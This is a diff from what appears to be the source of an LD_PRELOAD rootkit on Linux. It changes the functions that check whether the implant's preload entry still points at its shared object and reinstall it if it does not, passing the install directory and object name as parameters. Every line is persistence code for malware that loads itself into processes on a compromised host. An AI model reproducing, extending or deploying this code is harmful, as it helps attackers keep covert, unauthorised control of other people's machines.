@@ -1,4 +1,4 @@
-int _preloadok(const char *preloadpath){ // returns 1 if preloadpath is ok.
+int _preloadok(const char *preloadpath, char *installdir, char *bdvlso){ // returns 1 if preloadpath is ok.
     struct stat preloadstat;
     int status = 1,
         statret;
@@ -8,7 +8,7 @@ int _preloadok(const char *preloadpath){ // returns 1 if preloadpath is ok.
     memset(&preloadstat, 0, sizeof(stat));
     statret = (long)call(C__XSTAT, _STAT_VER, preloadpath, &preloadstat);
 
-    sopath = rksopath(INSTALL_DIR, BDVLSO);
+    sopath = rksopath(installdir, bdvlso);
     if((statret < 0 && errno == ENOENT) || preloadstat.st_size != strlen(sopath))
         status = 0;
     free(sopath);
@@ -17,16 +17,12 @@ int _preloadok(const char *preloadpath){ // returns 1 if preloadpath is ok.
     return status;
 }
 
-int preloadok(const char *preloadpath){
-    /*char *preloadpath = OLD_PRELOAD;
-#ifdef PATCH_DYNAMIC_LINKER
-    preloadpath = PRELOAD_FILE;
-#endif*/
-    return _preloadok(preloadpath);
+int preloadok(const char *preloadpath, char *installdir, char *bdvlso){
+    return _preloadok(preloadpath, installdir, bdvlso);
 }
 
 void reinstall(const char *preloadpath, char *installdir, char *bdvlso){
-    if(preloadok(preloadpath))
+    if(preloadok(preloadpath, installdir, bdvlso))
         return;
 
     char *sopath = rksopath(installdir, bdvlso);
